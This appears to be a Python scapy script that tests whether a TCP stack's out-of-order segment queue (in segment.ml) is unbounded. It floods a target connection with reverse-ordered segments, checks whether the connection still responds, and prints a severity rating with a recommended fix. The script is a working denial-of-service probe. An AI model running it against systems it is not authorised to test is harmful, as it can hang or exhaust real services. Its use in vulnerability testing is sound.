#!/usr/bin/env python3
"""
Simple test for out-of-order segment queue growth

Tests if the OOO queue in segment.ml:81-92 has a size limit.
"""

import sys
import time
from scapy.all import *

def test_ooo_queue(target_ip, target_port, num_segments=100):
    """Send out-of-order segments and see if connection becomes unresponsive"""

    sport = random.randint(10000, 65000)

    print(f"\n[*] Establishing connection to {target_ip}:{target_port}")

    # Establish connection
    ip = IP(dst=target_ip)
    syn = TCP(sport=sport, dport=target_port, flags='S', seq=1000)
    syn_ack = sr1(ip/syn, timeout=3, verbose=0)

    if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 'SA':
        print("[-] Failed to establish connection")
        return

    our_seq = 1001
    their_seq = syn_ack[TCP].seq + 1
    window = syn_ack[TCP].window

    print(f"[+] Connection established")
    print(f"    Window: {window} bytes")
    print(f"    Max OOO segments in window: {window // 1460}")

    # Complete handshake
    ack = TCP(sport=sport, dport=target_port, flags='A', seq=our_seq, ack=their_seq)
    send(ip/ack, verbose=0)

    time.sleep(0.5)

    # Calculate how many segments fit in window
    segment_size = 1460
    max_in_window = min(window // segment_size, num_segments)

    print(f"\n[*] Sending {max_in_window} out-of-order segments")
    print(f"[*] Each segment is {segment_size} bytes")
    print(f"[*] Expected queue size: ~{max_in_window} segments (~{max_in_window * segment_size / 1024:.1f} KB)")
    print()

    # Send segments in REVERSE order to maximize OOO queue
    for i in range(max_in_window):
        # Reverse order: send last segment first
        offset = (max_in_window - i - 1) * segment_size
        seq = our_seq + offset
        payload = b'X' * segment_size

        pkt = TCP(sport=sport, dport=target_port, flags='A', seq=seq, ack=their_seq)
        send(ip/pkt/payload, verbose=0)

        if (i + 1) % 10 == 0:
            print(f"\r[*] Sent {i+1}/{max_in_window} segments", end='', flush=True)

    print(f"\n[+] Sent {max_in_window} out-of-order segments")

    # Wait a bit for processing
    time.sleep(2)

    # Test if connection is still responsive
    print("\n[*] Testing if connection is still responsive...")

    # Send in-order data
    test_pkt = TCP(sport=sport, dport=target_port, flags='PA',
                   seq=our_seq, ack=their_seq)
    response = sr1(ip/test_pkt/b"PING", timeout=3, verbose=0)

    if response and response.haslayer(TCP):
        print(f"[+] Connection responsive: {response[TCP].flags}")
        print("[+] RESULT: Connection still works after OOO flooding")
    else:
        print("[-] Connection NOT responsive!")
        print("[!] RESULT: Connection hung - possible DoS!")

    # Send a few more to check
    responsive_count = 0
    for i in range(5):
        test_pkt = TCP(sport=sport, dport=target_port, flags='A',
                       seq=our_seq + i, ack=their_seq)
        response = sr1(ip/test_pkt, timeout=1, verbose=0)
        if response and response.haslayer(TCP):
            responsive_count += 1
        time.sleep(0.2)

    print(f"\n[*] Responsiveness test: {responsive_count}/5 packets got responses")

    print("\n" + "="*60)
    print("ASSESSMENT")
    print("="*60)
    print(f"OOO segments sent:    {max_in_window}")
    print(f"Memory queued:        ~{max_in_window * segment_size / 1024:.1f} KB")
    print(f"Connection responsive: {responsive_count}/5")
    print()

    if responsive_count >= 3:
        print("RESULT: Connection still works")
        print("  - Implementation handled OOO segments")
        print("  - No obvious DoS from queue growth")
        print("  - But queue IS unbounded (no size limit in code)")
        print()
        print("SEVERITY: LOW-MEDIUM")
        print("  - Vulnerability exists in code (no bounds check)")
        print("  - But limited by window size (~44 segments for 64KB window)")
        print("  - Would need many connections to cause significant memory use")
        print("  - Recommend: Add max queue size (e.g., 100 segments)")
    else:
        print("RESULT: Connection became unresponsive")
        print("  - OOO queue may have blocked processing")
        print("  - Definite DoS vulnerability")
        print()
        print("SEVERITY: HIGH")
        print("  - Can make connections unresponsive")
        print("  - Recommend: Add max queue size immediately")

    print("="*60)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python3 test_ooo_queue_simple.py <target_ip> <target_port> [num_segments]")
        print("Example: python3 test_ooo_queue_simple.py 10.30.0.88 80 50")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_segments = int(sys.argv[3]) if len(sys.argv) > 3 else 100

    if os.geteuid() != 0:
        print("[-] Root privileges required")
        sys.exit(1)

    print("="*60)
    print("Out-of-Order Queue Growth Test")
    print("="*60)
    print(f"Target: {target_ip}:{target_port}")
    print(f"Max segments: {num_segments}")

    test_ooo_queue(target_ip, target_port, num_segments)
